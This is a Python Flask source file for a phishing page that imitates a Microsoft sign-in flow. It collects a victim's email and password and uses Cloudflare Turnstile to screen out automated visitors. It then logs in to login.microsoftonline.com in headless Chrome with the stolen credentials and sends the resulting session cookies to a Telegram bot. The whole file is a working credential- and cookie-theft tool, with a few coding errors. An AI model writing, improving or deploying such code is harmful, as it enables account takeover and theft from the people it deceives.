from flask import Flask, request, render_template, jsonify, session
import re
import dns.resolver
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from time import sleep
import requests
import logging
from flask_session import Session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from python_decouple import config
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Email
import bcrypt
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sentry_sdk

# Initialize Sentry for monitoring (optional)
sentry_dsn = config('SENTRY_DSN', default=None)
if sentry_dsn:
    sentry_sdk.init(dsn=sentry_dsn)

app = Flask(__name__)
app.secret_key = config('SECRET_KEY')
app.config['SESSION_TYPE'] = 'redis'  # Switch to Redis for security
app.config['SESSION_REDIS_URL'] = 'redis://localhost:6379/0'  # Configure Redis server
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
Session(app)
db = SQLAlchemy(app)
csrf = CSRFProtect(app)
limiter = Limiter(app, key_func=get_remote_address)
logging.basicConfig(level=logging.INFO, filename='logs/app.log')

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(128))

class LoginForm(FlaskForm):
    email = StringField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Next' if request.args.get('step') == 'email' else 'Sign in')

@app.route('/')
@limiter.limit("10 per minute")
def index():
    email = request.args.get('email')
    autograb = request.args.get('autograb')
    step = 'password' if email or autograb else 'email'
    error = request.args.get('error', '')
    if step == 'email':
        if not email:
            return "No email"
        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
            return "Invalid format"
        domain = email.split('@')[1]
        try:
            dns.resolver.resolve(domain, 'MX')
        except Exception as e:
            logging.error(f"MX lookup failed: {e}")
            return "Invalid domain"
    form = LoginForm()
    sitekey = config('CLOUDFLARE_SITEKEY')
    return render_template('index.html', form=form, email=email, step=step, error=error, sitekey=sitekey)

@app.route('/verify-turnstile', methods=['POST'])
def verify_turnstile():
    token = request.form.get('cf-turnstile-response')
    secret_key = config('CLOUDFLARE_SECRET_KEY')
    response = requests.post(
        'https://challenges.cloudflare.com/turnstile/v0/siteverify',
        data={'secret': secret_key, 'response': token},
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    result = response.json()
    return jsonify({'success': result.get('success', False)})

@app.route('/', methods=['POST'])
@limiter.limit("10 per minute")
def process_form():
    form = LoginForm()
    if form.validate_on_submit():
        response = requests.post(
            url_for('verify_turnstile', _external=True),
            data={'cf-turnstile-response': request.form.get('cf-turnstile-response')}
        )
        if response.json().get('success'):
            email = form.email.data if request.form['submit'] == 'Next' else request.args.get('email')
            if request.form['submit'] == 'Next':
                return f'<meta http-equiv="refresh" content="0;url=/?step=password&email={email}">'
            password = form.password.data
            try:
                user = User.query.filter_by(email=email).first()
                if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
                    options = webdriver.ChromeOptions()
                    options.add_argument("--headless")
                    driver = webdriver.Chrome(options=options)
                    driver.get("https://login.microsoftonline.com")
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "loginfmt")))
                    driver.find_element(By.NAME, "loginfmt").send_keys(email)
                    driver.find_element(By.ID, "idSIButton9").click()
                    sleep(2)
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "passwd")))
                    driver.find_element(By.NAME, "passwd").send_keys(password)
                    driver.find_element(By.ID, "idSIButton9").click()
                    sleep(5)
                    if "error" in driver.current_url:
                        driver.quit()
                        logging.error(f"Failed login for {email}")
                        return f'<meta http-equiv="refresh" content="0;url=/?step=password&email={email}&error=true">'
                    cookies = driver.get_cookies()
                    driver.quit()
                    with open('cookies.txt', 'w') as f:
                        for c in cookies:
                            f.write(f"{c['name']}: {c['value']}\n")
                    bot_token = config('BOT_TOKEN')
                    chat_id = config('CHAT_ID')
                    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                    requests.post(url, data={'chat_id': chat_id}, files={'document': open('cookies.txt', 'rb')})
                    logging.info(f"Successful login for {email}")
                    return "Success"
                else:
                    logging.error(f"Failed login for {email}")
                    return f'<meta http-equiv="refresh" content="0;url=/?step=password&email={email}&error=true">'
            except Exception as e:
                logging.error(f"Database or login error: {e}")
                return f'<meta http-equiv="refresh" content="0;url=/?step=password&email={email}&error=true">'
    return index()

with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(debug=True)